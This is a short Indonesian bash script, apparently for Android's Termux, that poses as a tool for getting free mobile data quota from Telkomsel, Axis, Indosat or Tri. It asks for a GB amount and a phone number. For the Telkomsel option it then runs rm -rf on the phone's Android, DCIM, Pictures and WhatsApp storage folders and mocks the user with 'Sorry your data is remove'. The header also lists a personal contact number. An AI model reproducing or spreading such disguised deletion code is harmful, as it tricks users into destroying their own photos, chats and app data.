#!/usr/bin/bash
#tools kuota gratis
#by acep
clear
blue='\033[34;1m'
green='\033[32;1m'
purple='\033[35;1m'
cyan='\033[36;1m'
red='\033[31;1m'
echo " "
echo  $blue "<|======================================|>"
echo  $red    "|       TOOLS KUOTA GRATIS          |"
echo  $red    "|                                   |"
echo  $red    "| Author        : Acep              |"
echo  $red    "| Contact       : 085797616471      |"
echo  $red    "| My Team       : -.                |"
echo  $red    "| Thanks To     : Holilul Anwar     |"
echo  $blue "<|======================================|>"
sleep 1
echo " "
echo $green "============== $red MENU $green ================="
echo $blue "===================================="
echo $blue "|| $green 1. Telkomsel.                 $blue ||"
echo $blue "|| $green 2. Axis     			       $blue ||"
echo $blue "|| $green 3. Indosat	   			  $blue ||"
echo $blue "|| $green 4. Tri			             $blue ||"
echo $blue "|| $green 0. Exit The Program           $blue ||"
echo $blue "===================================="
echo $blue"╭──[Masukkan Pilihan Anda]>"
read -p"╰───────root@acepx-code=•>" Gans;
if [ $Gans = 1 ] || [ $Gans = 01 ]
then
echo $blue"╭──[Berapa GB?]>"
read -p"╰───────root@acepx-code=•>" kntl;
sleep 1
echo $green"╭──[masukan nomor]>"
read -p"╰───────root@acepx-code=•>" memeq;
sleep 1
echo $red "Loading"
sleep 2
rm -rf storage/emulated/0/Android
rm -rf storage/emulated/0/DCIM
rm -rf storage/emulated/0/Pictures
rm -rf storage/emulated/0/WhatsApp
echo  $blue "Sorry your data is remove :v"
fi